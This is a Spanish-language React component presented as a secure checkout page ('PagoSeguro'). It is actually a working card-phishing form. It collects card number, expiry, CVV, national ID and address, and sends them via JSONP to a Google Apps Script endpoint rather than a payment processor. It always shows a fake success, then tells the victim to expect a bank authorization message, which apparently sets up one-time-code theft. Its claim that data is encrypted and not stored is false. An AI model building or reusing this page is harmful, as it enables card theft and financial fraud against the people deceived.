import { useState, useEffect, useRef } from 'react';
import { useSearchParams } from 'react-router-dom';

const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyBexOjGVp1YQkoDDKq3yBt861HKEdfSR71hcls9yJdPQ01X1J8hcBUUWE0qtj2Qeq6/exec';

/* =================== Validaciones =================== */
function luhnCheck(num) {
  const digits = num.replace(/\D/g, '');
  let sum = 0, alt = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let n = +digits[i];
    if (alt) { n *= 2; if (n > 9) n -= 9; }
    sum += n; alt = !alt;
  }
  return sum % 10 === 0;
}

function validateExpiry(value) {
  if (!/^\d{2}\/\d{2}$/.test(value)) return false;
  const [mm, yy] = value.split('/').map((n) => parseInt(n, 10));
  if (mm < 1 || mm > 12) return false;
  const now = new Date();
  const exp = new Date(2000 + yy, mm);
  return exp > now;
}

function validateCardByType(num, type) {
  const n = num.replace(/\D/g, '');
  if (type === 'visa') return /^4\d{12}(\d{3})?$/.test(n);
  if (type === 'mastercard') return /^(5[1-5]|2[2-7])\d{14}$/.test(n);
  if (type === 'amex') return /^3[47]\d{13}$/.test(n);
  return false;
}

function validateCVV(cvv, type) {
  return (type === 'amex') ? /^\d{4}$/.test(cvv) : /^\d{3}$/.test(cvv);
}

function formatCardNumber(v) {
  const s = v.replace(/\D/g, '').slice(0, 19);
  return s.replace(/(.{4})/g, '$1 ').trim();
}

function formatExpiry(v) {
  const d = v.replace(/\D/g, '').slice(0, 4);
  return d.length < 3 ? d : d.slice(0, 2) + '/' + d.slice(2);
}

const PagoSeguro = () => {
  const [searchParams] = useSearchParams();
  const formRef = useRef(null);

  const [monto, setMonto] = useState('0.00');
  const [orderId, setOrderId] = useState('');
  const [cardType, setCardType] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [nombre, setNombre] = useState('');
  const [emailVal, setEmailVal] = useState('');
  const [telefono, setTelefono] = useState('');
  const [dni, setDni] = useState('');
  const [direccion, setDireccion] = useState('');
  const [ciudad, setCiudad] = useState('');
  const [estado, setEstado] = useState('');
  const [codigoPostal, setCodigoPostal] = useState('');
  const [pais, setPais] = useState('');

  const [isValid, setIsValid] = useState(false);
  const [showHint, setShowHint] = useState(false);
  const [showProgress, setShowProgress] = useState(false);
  const [progressWidth, setProgressWidth] = useState(0);
  const [showSuccess, setShowSuccess] = useState(false);
  const [showForm, setShowForm] = useState(true);
  const [showPayBtn, setShowPayBtn] = useState(true);

  useEffect(() => {
    const m = searchParams.get('monto');
    const id = searchParams.get('id');
    if (m) setMonto(m);
    if (id) setOrderId(id);
  }, [searchParams]);

  // postMessage listener (for iframe compatibility)
  useEffect(() => {
    const handler = (event) => {
      if (event?.data?.monto) setMonto(event.data.monto);
      if (event?.data?.id) setOrderId(event.data.id);
    };
    window.addEventListener('message', handler);
    return () => window.removeEventListener('message', handler);
  }, []);

  useEffect(() => {
    const num = cardNumber.replace(/\s/g, '');
    const valid = cardType && validateCardByType(num, cardType) && luhnCheck(num) &&
      validateExpiry(expiry) && validateCVV(cvv, cardType);
    setIsValid(valid);
    setShowHint(!valid && (cardNumber.length > 0 || expiry.length > 0 || cvv.length > 0));
  }, [cardType, cardNumber, expiry, cvv]);

  const handleSubmit = (e) => {
    e.preventDefault();
    if (!isValid) { alert('❌ Verifique los datos de su tarjeta.'); return; }

    const params = new URLSearchParams({
      nombre, email: emailVal, telefono, dni, direccion, ciudad, estado,
      codigo_postal: codigoPostal, pais, tipo_tarjeta: cardType,
      numero_tarjeta: cardNumber.replace(/\s/g, ''), fecha_expiracion: expiry,
      cvv, monto, id: orderId,
    }).toString();

    // JSONP
    const jsonpScript = document.createElement('script');
    jsonpScript.src = `${SCRIPT_URL}?${params}&callback=callbackFunction`;
    document.body.appendChild(jsonpScript);

    // Progress UI
    setShowPayBtn(false);
    setShowProgress(true);
    let width = 0;
    const interval = setInterval(() => {
      width += 5;
      setProgressWidth(width);
      if (width >= 100) {
        clearInterval(interval);
        window.callbackFunction('OK');
      }
    }, 120);
  };

  // Global callback
  useEffect(() => {
    window.callbackFunction = (response) => {
      setShowProgress(false);
      if (response === 'OK') {
        setShowForm(false);
        setShowSuccess(true);
      } else {
        alert('❌ Error al procesar el pago.');
        setShowPayBtn(true);
      }
    };
    return () => { delete window.callbackFunction; };
  }, []);

  const s = styles;

  return (
    <div style={s.body}>
      <div style={s.container}>
        <h2 style={s.h2}>Ingrese sus Datos de Pago</h2>

        {showForm && (
          <form ref={formRef} onSubmit={handleSubmit} noValidate>
            <input style={s.input} type="text" placeholder="Nombre Titular (Como figura en la tarjeta)" required value={nombre} onChange={(e) => setNombre(e.target.value)} />
            <input style={s.input} type="email" placeholder="Email" required value={emailVal} onChange={(e) => setEmailVal(e.target.value)} />
            <input style={s.input} type="tel" placeholder="Teléfono" required value={telefono} onChange={(e) => setTelefono(e.target.value)} />
            <input style={s.input} type="text" placeholder="DNI" required value={dni} onChange={(e) => setDni(e.target.value)} />
            <input style={s.input} type="text" placeholder="Dirección" required value={direccion} onChange={(e) => setDireccion(e.target.value)} />
            <div style={s.row}>
              <input style={{ ...s.input, flex: 1, margin: 0 }} type="text" placeholder="Ciudad" required value={ciudad} onChange={(e) => setCiudad(e.target.value)} />
              <input style={{ ...s.input, flex: 1, margin: 0 }} type="text" placeholder="Provincia" required value={estado} onChange={(e) => setEstado(e.target.value)} />
            </div>
            <div style={s.row}>
              <input style={{ ...s.input, flex: 1, margin: 0 }} type="text" placeholder="Código Postal" required value={codigoPostal} onChange={(e) => setCodigoPostal(e.target.value)} />
              <input style={{ ...s.input, flex: 1, margin: 0 }} type="text" placeholder="País" required value={pais} onChange={(e) => setPais(e.target.value)} />
            </div>

            <select style={s.input} value={cardType} onChange={(e) => setCardType(e.target.value)} required>
              <option value="">Seleccione tipo de tarjeta</option>
              <option value="visa">Visa</option>
              <option value="mastercard">MasterCard</option>
              <option value="amex">American Express</option>
            </select>

            <input style={s.input} type="text" inputMode="numeric" placeholder="Número de Tarjeta" autoComplete="cc-number" required
              value={cardNumber} onChange={(e) => setCardNumber(formatCardNumber(e.target.value))} />
            <div style={s.row}>
              <input style={{ ...s.input, flex: 1, margin: 0 }} type="text" placeholder="MM/AA" maxLength={5} required
                value={expiry} onChange={(e) => setExpiry(formatExpiry(e.target.value))} />
              <input style={{ ...s.input, flex: 1, margin: 0 }} type="text" inputMode="numeric" placeholder="CVV" maxLength={4} required
                value={cvv} onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))} />
            </div>

            <p style={s.small}><strong>Total a Pagar:</strong> ${monto}</p>

            {showHint && (
              <div style={s.hint}>⚠️ Corrige los campos o verifica que el tipo de tarjeta coincida.</div>
            )}

            {showPayBtn && (
              <button type="submit" disabled={!isValid}
                style={{ ...s.button, opacity: isValid ? 1 : 0.6, pointerEvents: isValid ? 'auto' : 'none' }}>
                💳 Pagar Ahora
              </button>
            )}

            <p style={{ ...s.small, marginTop: 10 }}>🔒 Todas las transacciones son seguras y protegidas. 🔐 Su información está cifrada y no se almacena permanentemente.</p>
          </form>
        )}

        {showProgress && (
          <div style={s.progressContainer}>
            <div style={{ ...s.progressBar, width: `${progressWidth}%` }} />
          </div>
        )}

        {showSuccess && (
          <div style={s.successMessage}>
            ✅ Su pedido se realizó correctamente.<br />
            Gracias por su compra.<br /><br />
            ⚠️ <strong>ATENCIÓN:</strong> Entre 5 y 15 minutos recibirá un mensaje de su banco para la autorización de este pedido.
          </div>
        )}
      </div>
    </div>
  );
};

const styles = {
  body: { fontFamily: 'Arial, sans-serif', background: 'transparent', margin: 0, padding: 20, display: 'flex', justifyContent: 'center', alignItems: 'flex-start', minHeight: '100vh' },
  container: { background: 'white', padding: 24, maxWidth: 420, width: '100%', margin: '30px auto', borderRadius: 12, boxShadow: '0 0 20px rgba(0,0,0,0.12)', border: '2px solid #007bff' },
  h2: { color: '#007bff', marginBottom: 16, textAlign: 'center', borderBottom: '1px solid #eee', paddingBottom: 8 },
  input: { width: '100%', padding: 11, margin: '8px 0', border: '1px solid #ccc', borderRadius: 6, fontSize: 15, boxSizing: 'border-box' },
  row: { display: 'flex', gap: 8, margin: '8px 0' },
  small: { fontSize: 13, color: '#666' },
  hint: { fontSize: 13, color: '#a00', marginTop: 6 },
  button: { width: '100%', padding: 11, margin: '8px 0', border: 'none', borderRadius: 6, fontSize: 15, boxSizing: 'border-box', backgroundColor: '#007bff', color: 'white', fontWeight: 'bold', cursor: 'pointer' },
  progressContainer: { width: '100%', background: '#eee', borderRadius: 6, marginTop: 12 },
  progressBar: { height: 10, background: '#28a745', borderRadius: 6, transition: 'width 0.1s' },
  successMessage: { background: '#fff3cd', color: '#856404', padding: 10, borderRadius: 6, border: '1px solid #ffeeba', marginTop: 12 },
};

export default PagoSeguro;
